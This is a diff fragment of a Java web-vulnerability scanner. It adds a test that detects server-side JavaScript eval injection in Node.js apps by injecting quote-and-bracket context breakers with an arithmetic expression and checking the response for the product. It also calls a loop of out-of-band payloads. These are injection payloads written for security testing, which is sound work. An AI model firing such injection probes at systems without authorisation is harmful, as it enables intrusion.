+     * fresh random operands. The result ({@code A*B}) appears in the response if the eval executes.
+     *
+     * <p>Why {@code .toString()}: ensures the product is coerced to a string before the {@code +}
+     * operator, so {@code leftSide + "7006652"} always concatenates (JS string coercion) and the
+     * result always CONTAINS the exact number, regardless of what the left side evaluates to.
+     * Input reflection can never compute {@code A*B} — it would need to evaluate the expression.
+     *
+     * <p>Why this beats id/passwd for initial detection: the arithmetic result appears in the
+     * response even when the app passes the eval result to another function (e.g., QR generator,
+     * template renderer) that may surface it in an error or partial output. The {@code id} output
+     * only appears if the server explicitly echoes command stdout back to the client.
+     */
+    private boolean testNodejsMath(HttpRequestResponse original, CmdiTarget target,
+                                    String url, String baselineBody)
+            throws InterruptedException {
+
+        // Same context breakers as the OOB/time/output payload arrays — covers the five most
+        // common Node.js eval idioms.
+        String[] breakers = {
+            String.valueOf('\''),                           // '       eval("'" + input + "'")
+            String.valueOf('\'') + ")",                     // ')      eval(fn(input))
+            String.valueOf('\'') + "})",                    // '})     eval(fn({key: input}))
+            String.valueOf('\'') + "))",                    // '))     eval(outer(inner(input)))
+            String.valueOf('\'') + "}}" + "))",             // '}}))   eval(outer({key: inner({k:input})}))
+        };
+
+        for (String breaker : breakers) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+            if (oobConfirmedParams.contains(target.name)) return false;
+
+            int a = 1000 + SECURE_RANDOM.nextInt(9000);
+            int b = 1000 + SECURE_RANDOM.nextInt(9000);
+            String expectedStr = String.valueOf((long) a * b);
+
+            // .toString() coerces the number to a string so that JS + always concatenates,
+            // making the result always contain the exact product regardless of left-side type.
+            // // is a JS single-line comment — silences trailing eval string characters.
+            String payload = breaker + " + (" + a + "*" + b + ").toString()//";
+
+            HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            if (body == null || body.isEmpty()) { perHostDelay(); continue; }
+            if (baselineBody.isEmpty()) { perHostDelay(); continue; }
+
+            // Word-boundary check: the product must appear as a standalone number, not as a
+            // substring of a larger number (e.g. "7006652" inside "17006652" would be a FP).
+            boolean standaloneInBody = containsStandaloneNumber(body, expectedStr);
+            boolean standaloneInBaseline = containsStandaloneNumber(baselineBody, expectedStr);
+
+            if (standaloneInBody && !standaloneInBaseline) {
+                findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                                "Server-Side JavaScript Injection (Arithmetic Output)",
+                                Severity.CRITICAL, Confidence.CERTAIN)
+                        .url(url).parameter(target.name)
+                        .evidence("Context breaker: '" + breaker + "'"
+                                + " | Payload: " + payload
+                                + " | JS product '" + expectedStr + "' (" + a + "*" + b + ") in response, absent in baseline")
+                        .description("Server-side JavaScript injection confirmed via arithmetic evaluation. "
+                                + "The expression (" + a + "*" + b + ") was injected into a JS eval context. "
+                                + "The server returned the computed product '" + expectedStr + "' in its response. "
+                                + "Only actual JavaScript execution can produce this value — "
+                                + "input reflection cannot evaluate the arithmetic expression. "
+                                + "Parameter '" + target.name + "' is vulnerable to SSJI (eval injection).")
+                        .responseEvidence(expectedStr)
+                        .payload(payload)
+                        .requestResponse(result)
+                        .build());
+                return true;
+            }
+            perHostDelay();
+        }
+        return false;
+    }
+
+    /**
+     * Returns true if {@code number} appears in {@code body} as a standalone numeric token —
+     * not immediately adjacent to another digit. Prevents false positives from a product like
+     * "7006652" matching inside a larger number such as "17006652" or "70066520".
+     */
+    private static boolean containsStandaloneNumber(String body, String number) {
+        if (body == null || body.isEmpty() || number == null || number.isEmpty()) return false;
+        int idx = body.indexOf(number);
+        while (idx >= 0) {
+            boolean prevOk = idx == 0 || !Character.isDigit(body.charAt(idx - 1));
+            boolean nextOk = (idx + number.length() >= body.length())
+                          || !Character.isDigit(body.charAt(idx + number.length()));
+            if (prevOk && nextOk) return true;
+            idx = body.indexOf(number, idx + 1);
+        }
+        return false;
+    }
+
+    private void testNodejsOob(HttpRequestResponse original, CmdiTarget target, String url)
+            throws InterruptedException {
+        for (String[] payloadInfo : NODEJS_OOB_PAYLOADS) {
+            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+            if (oobConfirmedParams.contains(target.name)) return;
+            sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Node.js SSJI");
+        }
     }
 
     // ==================== OOB VIA COLLABORATOR ====================
